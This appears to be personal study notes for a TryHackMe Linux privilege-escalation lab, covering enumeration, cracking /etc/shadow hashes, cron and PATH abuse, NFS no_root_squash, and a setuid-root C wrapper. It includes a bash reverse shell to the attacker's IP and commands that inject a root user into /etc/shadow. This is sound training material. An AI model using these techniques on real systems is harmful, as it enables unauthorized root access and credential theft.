# Linux Priviledge Escalation Techniques
TryHackMe Room: *Linux PrivEsc*, Link: [https://tryhackme.com/room/linprivesc](https://tryhackme.com/room/linprivesc)

> This is just a collection of notes made while working through theinteractive room, not nessarrily a proper writeup.
> This was an excelent room to practice different options. I have gone in and "solved" the challenges in multiple ways for the practice, and will probably return more to practice.
> I highly recommend this room.

> Note: I have replaced my IP address with **My_VPN_IP** throughout these notes

## All Test Machines initial Creds:
Username: karen
Password: Password1

## Enumeration of linux

`hostname` - glean info sometimes about domains, target's role on network, etc

`echo $SHELL` - see what shell is being used
`cat /etc/shells` - show all available shells
```
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
```

`uname -a` - get kernal info
```
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

`cat /proc/version` - more info on installation, points to research, might indicate compilers present
```
Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014
```

`cat /etc/issue` - another location for installation information
```
Ubuntu 14.04 LTS \n \l
```

`ps`, `ps -A`, `ps axjf`, `ps aux` - show processes, all processes, process tree, and proceses of all users (respectively)
> (output of regular `ps`)
```
   PID TTY          TIME CMD
 1625 pts/4    00:00:00 sh
 1699 pts/4    00:00:00 bash
 1804 pts/4    00:00:00 ps
```

`env` - show environment variables
```
XDG_SESSION_ID=1
SHELL=/bin/sh
TERM=screen
SSH_CLIENT=**My_VPN_IP** 42208 22
SSH_TTY=/dev/pts/4
USER=karen
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
MAIL=/var/mail/karen
QT_QPA_PLATFORMTHEME=appmenu-qt5
PWD=/
LANG=en_US.UTF-8
SHLVL=1
HOME=/home/karen
LOGNAME=karen
SSH_CONNECTION=**My_VPN_IP** 42208 10.10.213.207 22
XDG_RUNTIME_DIR=/run/user/1001
_=/usr/bin/env
```

`sudo -l` - can current user run any sudo on any commands?

`id` - show user's premission and groups
> uid=1001(karen) gid=1001(karen) groups=1001(karen)

`cat /etc/passwd` - list names, login options, groups, etc
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
dnsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/bin/false
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
kernoops:x:106:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
rtkit:x:107:114:RealtimeKit,,,:/proc:/bin/false
saned:x:108:115::/home/saned:/bin/false
whoopsie:x:109:116::/nonexistent:/bin/false
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
avahi:x:111:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
lightdm:x:112:118:Light Display Manager:/var/lib/lightdm:/bin/false
colord:x:113:121:colord colour management daemon,,,:/var/lib/colord:/bin/false
hplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/false
pulse:x:115:122:PulseAudio daemon,,,:/var/run/pulse:/bin/false
matt:x:1000:1000:matt,,,:/home/matt:/bin/bash
karen:x:1001:1001::/home/karen:
sshd:x:116:65534::/var/run/sshd:/usr/sbin/nologin
```
> can use command `cat /etc/passwd | grep home | cut -d ':' -f 1` to chop out a list of all the usernames (split each string by ":", then pull first item for all users that have a home directory (most likely "real" users)

`history` - has the user done anything of note or interesting? Plaintext passwords over cli?
`ifconfig` - is the box connected to another network? Pivot option? Pivot? PIVOT?
`ip route` - see which networks exist
```
default via 10.10.0.1 dev eth0
10.10.0.0/16 dev eth0  proto kernel  scope link  src 10.10.213.207
169.254.0.0/16 dev eth0  scope link  metric 1000
```

`netstat`
* `-a` all listening and established connections
* `-t` TCP only
* `-u` UDP only
* `-l` listening only
* `-s` usage stastics
* `-p` include service process ids (PIDs)
* `-i` interface stastics
* `-n` don't resolve names (ips only)
* `-o` show timers

`find` - search for specific or interesting files, requires a directory and some search criteria
* add `2>/dev/null` to redirect errors to null (discarding)
* numeric filters (like `-size` and `-atime` etc can have `+` and `-` before the number to filter greater and less than
* `-writable`, `-perm 222`, `-o w` finds that this user can modify (each flavor can get slightly different results

`python -i`, `python3 -i`, `php -v`, `node -v`, etc - find versions of programming and scripting tools


## Escalation
found exploit at [exploit-db](https://www.exploit-db.com/exploits/37292)
downloaded to local, uploaded to target
compiled with gcc
ran
got root!

Dig out setuid stuff with:
`find / -perm -04000 -type f -la 2>/dev/null`

If able to modify `/etc/shadow`:
create user
generate password and hash with `openssl passwd -1 -salt WAT Password1`
add that hash after `me:` and the after the hash add `:0:0:root:/root:/bin/bash`
now you can log on with user `me` and password `Password1`

## Password crack
```
$ cat /etc/passwd | grep home
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
gerryconway:x:1001:1001::/home/gerryconway:/bin/sh
user2:x:1002:1002::/home/user2:/bin/sh
karen:x:1003:1003::/home/karen:/bin/sh
```
Exerpt from /etc/shadow:
```
ubuntu:!:18796:0:99999:7:::
gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:18796:0:99999:7:::
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:18796:0:99999:7:::
```

`ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash`

### password crack with john the ripper:
get passwd and shadow
`unshadow passwd.txt shadow.txt > passwords.txt`
`john --wordlist=~/resources/rockyou.txt passwords.txt`

### Setuid Bins:
```
/snap/core/10185/bin/mount
/snap/core/10185/bin/ping
/snap/core/10185/bin/ping6
/snap/core/10185/bin/su
/snap/core/10185/bin/umount
/snap/core/10185/usr/bin/chfn
/snap/core/10185/usr/bin/chsh
/snap/core/10185/usr/bin/gpasswd
/snap/core/10185/usr/bin/newgrp
/snap/core/10185/usr/bin/passwd
/snap/core/10185/usr/bin/sudo
/snap/core/10185/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/10185/usr/lib/openssh/ssh-keysign
/snap/core/10185/usr/lib/snapd/snap-confine
/snap/core/10185/usr/sbin/pppd
/snap/core18/1885/bin/mount
/snap/core18/1885/bin/ping
/snap/core18/1885/bin/su
/snap/core18/1885/bin/umount
/snap/core18/1885/usr/bin/chfn
/snap/core18/1885/usr/bin/chsh
/snap/core18/1885/usr/bin/gpasswd
/snap/core18/1885/usr/bin/newgrp
/snap/core18/1885/usr/bin/passwd
/snap/core18/1885/usr/bin/sudo
/snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1885/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/base64
/usr/bin/su
/usr/bin/fusermount
/usr/bin/at
/usr/bin/mount
```

## Get Capabilities Enumeration
`getcap -r / 2>/dev/null` - gets capabilities set for current user
research any on [GTFOBins](https://gtfobins.github.io/)
```
$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
```
### LOOK FOR :py vs :py3 in GTFOBins compared to what the system might have

## Cron Jobs
> NetCat reverse listener: `nc -nvlp 9999`

> Bash reverse shell: `bash -i >& /dev/tcp/**My_VPN_IP**/9999 0>&1`

`cat /etc/crontab` - read cron jobs
```
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py
```

quick and dirty root:
added script to be run by cron by root: `chmod u+s /usr/bin/dash`
then run after the setuid bit is flipped with `/usr/bin/dash -p`
Root!

## Path Variable Abuse
> Quick pull of writable: `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`
Find a file that gets called relatively, add own script with same name, add folder to beginning of path.

## nfs
`cat /etc/exports` shows settings for nfs share configuration.
> Key is finding a no_root_squash setting

`showmount -e 10.10.133.183` - enumerates mountable NFS
`mount -o rw 10.10.133.183:/backups /tmp/myfolderdestination` - mounts the "backups" share from the nfs server to the /tmp/myfolderdestination

> Note: install `apt-file`, if you have a command that isn't found and you don't see it installable through apt-get install, then use apt-file to search and show the packages that have that command.

> For `showmount`, I had a "no command foudn" issue, and `sudo apt-get install showmount` doesn't find anything. I installed `apt-file` (`sudo apt-get install apt-file`, and then `sudo apt-file update`), and the running `apt-file search showmount` shows me that the `nfs-common` is the package that contains `showmount`, so I can install it with `sudo apt-get install nfs-common` and now I have access to using the `showmount` command.

![Showmount Results](/images\tryhackme\linuxprivesc\showmount_search.jpg)

### SetUid command script in C
`doAsRoot.c`
```
int main()
{
  setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```
> Replace `/bin/bash` with other command or path to suit the need

`gcc doAsRoot.c -o doAsRoot -w` - Compile with gcc
`chmod +s doAsRoot` - flip the setuid bit

